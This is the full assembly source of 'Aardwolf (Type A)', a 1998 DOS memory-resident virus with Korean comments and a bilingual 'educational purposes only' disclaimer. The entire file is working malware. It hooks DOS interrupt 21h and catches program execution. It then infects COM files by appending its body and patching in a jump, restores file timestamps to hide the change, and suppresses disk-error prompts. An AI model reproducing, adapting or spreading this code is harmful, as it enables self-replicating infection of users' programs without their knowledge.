;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					       \\\\\\\	\	\   \\\\\\\
;                                             \          \     \   \
;         Aardwolf (Type A)                   \           \   \    \    98/05
;					      \ 	   \ \	   \
;                                              \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : Aardwolf (Type A)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/20
; Type       : Memory resident COM
;
;  !*< 법률적 의무 >********************************************************!
;   *                                                                        *
;   * 경고 !                                                                 *
;   *        이 정보는 교육적인 목적으로만 사용되어야 합니다. 우리는 이      *
;   *        정보를 사용해서 발생하는 어떤 문제에 대해서도 책임을 지지 않    *
;   *        습니다. 모든 책임은 글을 읽는 사람에게 있습니다.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; 도스에서 제공하는 기능을 사용해서 기억장소에 상주 하는 바이러스이다.
; 기본적으로 예루살렘 바이러스에 많은 도움을 받았으며 Wanderer.II 소스도 일부
; 사용했다.
;
; ! Aardwolf (Type A) : 기억장소 상주, COM 감염
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

	    .286
	    .MODEL  TINY
	    .CODE

            org  0h

 PARASIZE   EQU  (End_Memory - Aardwolf + 0Fh) SHR 4 + 10h

 Aardwolf:
	    call  Get_Ip
 Get_Ip:    pop   si
	    sub   si,0003		    ; 바이러스가 시작되는 위치 얻기

            mov   ax,0f1f1h                 ; 상주 여부 검사
	    int   21h
	    cmp   ax,0f2f2h
	    jnz   Resident
                                            ; 기억장소에 바이러스가 존재하면
            add   si, offset Buffer         ; 원래 COM 의 앞부분 복구
	    mov   di, 100h
	    movsw
	    movsw
	    mov   ax,100h
	    push  ax
	    ret

 Resident:
            mov   PSP1[SI], ds              ; 재실행을 위해서 PSP 저장
	    mov   PSP2[SI], ds
	    mov   PSP3[SI], ds

            mov   ax, es                    ; 세그먼트를 바꾼다.
	    add   ax,0010h
	    mov   es,ax
	    push  es
	    mov   ax, offset New_CS
	    push  ax

	    mov   cx, offset End_virus	    ; 바이러스 복사
	    xor   di, di
	    repz  movsb
	    retf
 New_CS:
            push  cs                        ; CS=SS
	    pop   ss
	    mov   sp, offset End_Memory     ; 스택 조정

            push  cs                        ; Int 21h 주소 얻기
	    pop   ds
	    mov   ax, 3521h
	    int   21h

            mov   word ptr OldInt21,BX
            mov   word ptr OldInt21[2],ES

            mov   ax, 2521h                 ; Int 21h 주소 저장
	    push  cs
	    pop   es
	    mov   dx, offset NewInt21Handler
	    int   21h

	    mov   ah, 4ah		    ; 메모리 조정
	    mov   bx, PARASIZE
            mov   es, PSP1
            int   21h

            call  Set_env                   ; 실행 파일 이름 얻기

            push  cs
            pop   es

            mov   ax, 4b00h                 ; 원래 프로그램 실행
            mov   bx, offset Env_Block
	    call  Call_Int21

	    push  ds
	    pop   es

            mov   ah, 49h                   ; 메모리 해제
	    int   21h

            mov   ah, 31h                   ; 원래 프로그램 실행후 기억장소
            mov   dx, Parasize              ; 에 바이러스 상주함
	    int   21h

 Msg	    db	  0dh,0ah
            db    '[Aardwolf] Type.A',0dh,0ah
            db    '(c) Copyleft 1998 by Crom/CVC,Corea$'

;******************************************************************************
;	    Virus Int 21h Handler
;******************************************************************************

 NewInt21Handler:
	    pushf
	    cmp   ax, 0F1F1h		    ; 상주 여부 검사
	    jnz   Check_Execute
	    mov   ax, 0F2F2h
	    popf
	    iret

 Check_Execute:
            pusha                           ;
	    push  ds
	    push  es

	    cmp   ah,4Bh		    ; 실행인가 ?
	    jz	  SetInt24
            jmp   Pop_

 SetInt24:
            push  ds
            xor   ax,ax
            mov   ds,ax

	    push  DS:[0090h]		    ; Int 24h 값 저장
	    Push  DS:[0092h]

            mov   DS:[0090h],offset NewInt24; Int 24h 가로챔
	    mov   DS:[0092h],cs

            pop   ds                        ;
	    mov   ax,4300h		    ; 속성얻기
	    int   21h

	    push  ds			    ; 파일 이름
	    push  dx
	    push  cx			    ; 속성

	    xor   cx,cx 		    ; 읽기/쓰기로 바꿈
	    mov   ax,4301h
	    int   21h
	    jnc   Open_File
	    Jmp   Open_Fail		    ; 오류이면 끝냄

 Open_File:
	    mov   ax,3d02h		    ; 파일 오픈
	    int   21h
	    jnc   GetDT
	    jmp   Open_Fail
 GetDT:
            xchg  ax,bx                     ; 파일 핸들

            mov   ax,5700h                  ; 감염파일의 날짜/시간 얻기
	    int   21h
	    push  cx
	    push  dx

            push  cs                        ; cs=ds
	    pop   ds
            Push  cs                        ; cs=es
            Pop   es

	    mov   ah,3Fh		    ; 파일 읽기
            mov   dx,offset Buffer
            mov   cx,004h
	    int   21h

            mov   AX, word ptr Buffer       ;
            cmp   ax,'ZM'                   ; EXE 파일 인가 ?
            jz    Set_Date
            cmp   byte ptr Buffer, 0E9h     ; JMP 명령인가 ?
            jnz   Infect_COM
            cmp   byte ptr Buffer+3, 0FFh   ; 감염 되었나 ?
            jz    Set_Date
 Infect_COM:
            mov   ax,4202h                  ; 파일 끝으로 이동
            xor   cx,cx
            xor   dx,dx
            int   21h

            sub   ax,0003                   ;
            mov   word ptr Jump_Code+1, ax  ;

            mov   ah, 40h                   ; 바이러스 쓰기
            mov   cx, offset End_virus
            xor   dx, dx
            int   21h

            mov   ax, 4200h                 ; COM 처음으로 이동
            xor   cx, cx
            xor   dx, dx
            int   21h

            mov   ah, 40h                   ; 변형된 JMP 명령 쓰기
            mov   cx, 0004
            mov   dx, offset Jump_Code
            int   21h

 Set_Date:
	    pop   dx			    ; 날짜 복구
	    pop   cx
	    mov   ax,5701h		    ; 날짜/시간 정상으로 복구
	    int   21h
 Close_file:
	    mov   ah,3Eh		    ; 파일 닫기
	    int   21h
 Open_Fail:
	    mov   ax,4301h		    ; 원래 속성 변환
	    pop   cx
	    pop   dx
	    pop   ds
	    int   21h
	    xor   ax,ax 		    ; 원래 Int 24h 로 바꿈
	    mov   ds,ax
	    pop   DS:[0092h]
	    pop   DS:[0090h]
 pop_:
            pop   es
	    pop   ds
	    popa
	    popf

 Jmp_Org_Int21:
            db    0EAh                      ;
 OldInt21   dd	  ?

 NewInt24:
            xor   al,al                     ; Int 24h 핸들러
	    iret

;******************************************************************************
; 환경영역에서 재실행에 필요한 정보 얻기
;******************************************************************************

 Set_Env    proc  near

 Search_RD:                                 ; 재실행을 위한 정보를 얻어 낸다.
	    xor   si,si
	    mov   ax, PSP1
	    mov   ds,ax
	    mov   ds,ds:[002Ch] 	    ; 실행시킨 파일의 이름을 알아낸다.

 Search_RD_LOOP:
	    cmp   word ptr DS:[SI],0000     ; 파일이름전에는 0000이다.
	    jz	  Get_FileName		    ; PSP:[002Ch] --> 세그먼트
	    inc   si
	    jmp   Search_RD_LOOP

 Get_FileName:
	    add   si,0004
	    mov   dx,si 		    ; 현재 실행되는 파일이름
	    ret
 Set_env    endp

;
; 인터럽트 21h 호출
;

 Call_Int21 proc  near

	    pushf
	    call  dword ptr cs:OldInt21
	    ret

 Call_Int21 endp

;
; 재실행을 위한 블럭
;

 ENV_BLOCK  dw	  ?			    ; 재실행용 블럭
	    dw	  80h			    ;
 PSP1	    dw	  ?
	    dw	  5ch			    ;
 PSP2	    dw	  ?
	    dw	  6ch			    ;
 PSP3	    dw	  ?

 Jump_code  db    0E9h, ?, ?, 0FFh          ;
 Buffer     db    0CDh, 20h, 90h, 90h       ; 앞부분

 End_Virus:

	    db	  100h dup (?)		    ; 스택 부분
 End_Memory:

	    END   Aardwolf

